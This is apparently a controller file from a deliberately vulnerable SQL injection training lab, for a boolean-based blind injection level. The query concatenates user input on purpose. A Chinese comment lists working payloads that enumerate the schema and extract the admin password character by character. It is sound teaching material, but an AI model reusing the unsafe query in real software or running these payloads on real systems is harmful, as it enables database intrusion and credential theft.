const db = require('../../config/db');

/*
布尔盲注 (Boolean-Based Blind Injection) 解题思路：

1. 布尔盲注利用应用程序根据SQL查询结果返回不同页面内容的特性
2. 本挑战中只显示查询是否成功，不显示具体结果
3. 解题步骤：
   a. 首先确认存在注入漏洞:
      10 AND 1=1  (返回查询成功)
      10 AND 1=2  (返回查询失败)
      
   b. 利用布尔表达式逐位猜解数据库名称:
      10 AND ASCII(SUBSTRING(database(),1,1))=119  (检查数据库名第一个字符ASCII值是否为119，即'w')
      10 AND ASCII(SUBSTRING(database(),2,1))=101  (检查数据库名第二个字符ASCII值是否为101，即'e')
      ...以此类推
      
   c. 猜解表名:
      10 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=117
      
   d. 猜解列名:
      10 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))=105
      
   e. 逐位猜解数据:
      10 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97
      
4. 可以编写自动化脚本进行猜解，例如使用Python+requests库

5. 成功的注入语句示例:
   10 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'
*/

// 渲染SQL注入Level 4页面
exports.renderPage = (req, res) => {
  res.render('sqli/level4', {
    title: 'SQL注入 - Level 4 (布尔盲注)',
    activeMenu: 'sqli',
    result: null,
    error: null,
    query: ''
  });
};

// 处理SQL注入Level 4查询
exports.processQuery = async (req, res) => {
  const { id } = req.body;
  let result = null;
  let error = null;
  let success = false;
  
  try {
    // 不安全的查询 - 直接拼接用户输入
    const sql = `SELECT id FROM articles WHERE id = ${id}`;
    
    // 尝试执行查询
    const pool = db.getPool();
    if (!pool) {
      throw new Error('数据库未连接');
    }
    
    const [rows] = await pool.execute(sql);
    // 只返回查询是否成功，不返回具体数据
    success = rows.length > 0;
  } catch (err) {
    console.error('SQL注入Level 4查询错误:', err);
    error = err.message;
  }
  
  res.render('sqli/level4', {
    title: 'SQL注入 - Level 4 (布尔盲注)',
    activeMenu: 'sqli',
    success,
    error,
    query: id
  });
}; 